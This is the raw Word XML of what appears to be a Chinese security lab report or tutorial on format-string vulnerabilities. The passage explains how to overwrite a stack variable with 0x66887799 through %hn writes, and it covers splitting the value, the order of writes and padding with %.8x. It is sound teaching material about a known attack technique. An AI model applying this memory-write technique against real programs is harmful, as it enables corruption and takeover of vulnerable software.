                      <w:proofErr w:type="gramEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>c</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3F87016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c: 0x%x\n"</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>, c);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="394DFD2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7FF66DA0" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="page"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>要修改</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>的值为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>x66887799</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，可以用两个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sz w:val="24"/>
        </w:rPr>
        <w:t>来修改变量</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，一次修改两个字节，也可以使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>hhn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，一次修改</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>个字节，本次实验中选择使用</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hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD8A1DD"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sz w:val="24"/>
        </w:rPr>
        <w:t>把</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>变量分为两个部分，每个部分各两个字节。较低端的两字节地址是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>xbffff304</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，它们需要被改为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>x7799</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>；较高端的两字节地址是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>xbffff306</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，它们需要被改成</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>x6688</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>。用两个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sz w:val="24"/>
        </w:rPr>
        <w:t>格式规定符来更改这两处内存，则这两个地址都要存在</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>栈</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>中。在格式化字符串中植入这两个地址，这样它们就会被保存到</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>栈</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C6762D"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sz w:val="24"/>
        </w:rPr>
        <w:t>应该注意：</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sz w:val="24"/>
        </w:rPr>
        <w:t>对应的写入变量的值是累计的，也就是说，如果第一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>得到值</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，在遇到第二个</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sz w:val="24"/>
        </w:rPr>
        <w:t>之前，又打印了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>个</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>字符，那么第二个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>将得到</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>+t</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>。因此，先存小的值</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>x6688</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，再存大的值</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>x7799</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>。也就是先把</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>xbffff306</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>的两个字节改为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>x6688</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，接着再打印出一些字符，使得到达第二个地址</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0xbffff304)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>时，已被打印出的字符数增至</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>x7799</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B05C7C"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综合以上方法，假设</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>变量存放在地址</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>xbffff304</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>处，我们可以构造如图</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>所示字符串，将它的值更改为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>x66887799</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30D8ED78" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5691693E" wp14:editId="237F550E">
            <wp:extent cx="5274310" cy="1691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1691640"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D1AE811" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>图</w:t>
      </w:r>
      <w:r>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xml:space="preserve">SEQ </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:instrText>图</w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* ARABIC</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t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>用于攻击的格式化字符串的含义</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C4594FD" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>在该字符串中，对于前</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>格式规定符，将精度修饰符设置为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，使每个</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>整型数</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>被打印为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>位数。加上之前打印的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>个字符，</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rintf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>函数现在已打印了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
